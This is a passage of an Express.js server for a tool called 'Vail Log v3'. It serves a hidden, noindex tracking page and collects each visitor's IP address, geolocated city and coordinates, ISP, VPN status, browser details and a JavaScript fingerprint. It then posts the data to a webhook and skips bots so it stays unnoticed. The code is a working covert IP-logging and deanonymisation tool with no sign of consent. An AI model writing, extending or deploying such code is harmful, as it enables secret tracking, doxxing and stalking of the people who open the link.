// Health check
app.get('/', (req, res) => res.send('ok'));

// GET — serve tracking page
app.get(CONFIG.slug, (req, res) => {
  res.setHeader('X-Robots-Tag', 'noindex');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(buildPage());
});

// POST — receive JS fingerprint data, fire webhook
app.post(CONFIG.slug, async (req, res) => {
  res.send('ok'); // respond immediately

  const ip = getIP(req);
  const ua = req.headers['user-agent'] || '';

  if (CONFIG.blockBots && isBot(ua)) return;
  if (!dedupCheck(ip)) return;

  const cc = (req.headers['cf-ipcountry'] || '').toUpperCase();
  const blockCC = CONFIG.blockCC;
  const allowCC = CONFIG.allowCC;
  if (blockCC.length && blockCC.includes(cc)) return;
  if (allowCC.length && !allowCC.includes(cc)) return;

  const geo    = await fetchGeo(ip);
  const parsed = parseUA(ua);
  const geoCC  = (geo.countryCode || cc || '??').toUpperCase();

  const d = {
    ip,
    country: geo.country  || 'Unknown',
    cc:      geoCC,
    flag:    FLAGS[geoCC] || '🏳️',
    city:    geo.city     || '',
    region:  geo.regionName || '',
    lat:     String(geo.lat  || ''),
    lon:     String(geo.lon  || ''),
    isp:     geo.isp      || '',
    asn:     geo.as       || '',
    tz:      geo.timezone || '',
    vpn:     !!(geo.proxy || geo.hosting),
    bot:     isBot(ua),
    browser: parsed.browser,
    os:      parsed.os,
    device:  parsed.device,
    ua,
    ref:     req.headers['referer'] || '',
    lang:    req.headers['accept-language'] || '',
    method:  req.method,
    time:    new Date().toUTCString(),
    // JS fingerprint from POST body
    ...req.body,
  };

  await sendWebhook(d);
});

app.listen(PORT, () => console.log('Vail Log v3 listening on port '+PORT));